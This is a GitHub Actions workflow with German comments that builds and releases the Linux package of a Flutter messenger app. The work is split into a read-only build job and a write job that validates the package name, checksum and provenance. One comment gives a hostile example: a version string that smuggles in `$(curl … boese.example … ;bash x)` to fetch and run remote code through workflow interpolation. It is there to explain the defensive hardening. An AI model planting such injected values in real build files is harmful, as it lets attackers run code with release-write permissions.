# Linux-Fassung bauen — auf einem Linux-Runner von GitHub.
#
# Lokal hing der Bau an einem sudo in WSL, fuer das es ein Passwort braucht.
# Hier hat der Runner sudo. Bei einem Versions-Tag (v*) landet das Paket am
# Release; von Hand gestartet nur als Artefakt des Laufs.
#
# ZWEI AUFTRAEGE UND NUR EINER DARF SCHREIBEN (seit 25.09.2026). Bis dahin lief
# der ganze Bau — fremde Aktion, `flutter pub get`, Bau-Hooks der Pakete — mit
# einem Schluessel, der Release-Dateien ersetzen durfte (`--clobber`). Wer eine
# dieser Stellen uebernimmt, haette das Linux-Paket gegen ein praepariertes
# tauschen koennen. Jetzt baut `bauen` nur mit Leserecht; `anhaengen` holt das
# fertige Paket, beglaubigt seine Herkunft (Sigstore, `gh attestation verify`)
# und haengt es an — ohne Ueberschreiben.
name: Linux

on:
  push:
    tags: ['v*']
  workflow_dispatch:

permissions:
  contents: read

jobs:
  bauen:
    runs-on: ubuntu-22.04
    timeout-minutes: 40
    permissions:
      contents: read
    defaults:
      run:
        working-directory: secure-messenger/app
    outputs:
      paket: ${{ steps.schnueren.outputs.paket }}
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - name: Werkzeuge fuer den Linux-Bau
        run: |
          sudo apt-get update
          sudo apt-get install -y clang cmake ninja-build pkg-config libgtk-3-dev \
            libsecret-1-dev libjsoncpp-dev liblzma-dev libstdc++-12-dev
      - uses: subosito/flutter-action@1a449444c387b1966244ae4d4f8c696479add0b2 # v2
        with:
          flutter-version: '3.44.8'
          channel: stable
          cache: true
      - run: flutter config --enable-linux-desktop
      # --enforce-lockfile: der veroeffentlichte Bau nimmt GENAU die Fassungen
      # aus pubspec.lock und bricht ab, wenn sie nicht passen, statt still
      # neuere aufzuloesen (SonarQube Cloud, githubactions:S8550, 18.10.2026).
      - run: flutter pub get --enforce-lockfile
      - run: flutter build linux --release
      - name: Paket schnueren
        id: schnueren
        run: |
          VERSION=$(grep '^version:' pubspec.yaml | sed 's/version: //; s/+.*//')
          PAKET="bitdm-linux-x64-$VERSION.tar.gz"
          mkdir -p "$GITHUB_WORKSPACE/aus"
          tar -C build/linux/x64/release/bundle -czf "$GITHUB_WORKSPACE/aus/$PAKET" .
          (cd "$GITHUB_WORKSPACE/aus" && sha256sum "$PAKET" | tee "$PAKET.sha256")
          echo "paket=$PAKET" >> "$GITHUB_OUTPUT"
      - uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2
        with:
          name: linux-paket
          path: ${{ github.workspace }}/aus/

  anhaengen:
    needs: bauen
    if: startsWith(github.ref, 'refs/tags/v')
    runs-on: ubuntu-latest
    timeout-minutes: 10
    permissions:
      contents: write
      id-token: write
      attestations: write
    steps:
      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2
        with:
          name: linux-paket
          path: aus
      # DER NAME DES PAKETS KOMMT AUS DEM BAU-AUFTRAG, ALSO AUS EINER QUELLE,
      # DIE FREMDER CODE BESTIMMEN KANN.
      #
      # `bauen` hat nur Leserechte, genau deshalb ist es ein eigener Auftrag
      # (siehe Kopfkommentar). Fremder Code darin — pub-Pakete und ihre
      # Build-Hooks, CMake-Skripte der Plugins, apt-Pakete — kann aber die
      # pubspec.yaml im Arbeitsverzeichnis umschreiben, bevor der Schritt
      # „Paket schnueren“ die Fassung daraus liest. Zum Beispiel
      # `version: 1.9.1$(curl -sSfL boese.example -o x;bash x)+21`.
      #
      # In `bauen` bleibt das harmlos, weil "$PAKET" von der Shell nicht
      # erneut ausgewertet wird. Steht der Wert aber als `${{ }}` im Skript
      # DIESES Auftrags, setzt Actions ihn WOERTLICH in den Text ein, bevor
      # die Shell ihn sieht — und die fuehrt `$(…)` dann aus. In einem
      # Auftrag mit `contents: write` und `id-token: write` heisst das:
      # Release-Dateien ersetzen, auf main pushen, Sigstore-Beglaubigungen
      # unter dem Namen dieses Workflows ausstellen. Aus „das Linux-Paket ist
      # manipuliert“ wuerde „das Repo ist manipulierbar“.
      #
      # Deshalb: der Wert geht ueber `env:` hinein (dann ist er eine
      # Shell-Variable und wird nicht als Text eingesetzt) UND wird gegen ein
      # festes Muster geprueft, bevor ihn irgendetwas benutzt. Die
      # Beglaubigung bekommt den geprueften Wert, nicht den rohen.
      - name: Paketnamen pruefen
        id: pruefen
        env:
          PAKET: ${{ needs.bauen.outputs.paket }}
        run: |
          if [[ ! $PAKET =~ ^bitdm-linux-x64-[0-9]+\.[0-9]+\.[0-9]+\.tar\.gz$ ]]; then
            echo "Unerwarteter Paketname aus dem Bau-Auftrag." >&2
            exit 1
          fi
          echo "paket=$PAKET" >> "$GITHUB_OUTPUT"
      - name: Pruefsumme nachrechnen
        working-directory: aus
        env:
          PAKET: ${{ steps.pruefen.outputs.paket }}
        run: sha256sum -c "$PAKET.sha256"
      - uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8 # v4.2.2
        with:
          subject-path: aus/${{ steps.pruefen.outputs.paket }}
      - name: An den Release haengen
        env:
          GH_TOKEN: ${{ github.token }}
          PAKET: ${{ steps.pruefen.outputs.paket }}
        run: gh release upload "${GITHUB_REF_NAME}" "aus/$PAKET" "aus/$PAKET.sha256" -R "$GITHUB_REPOSITORY"
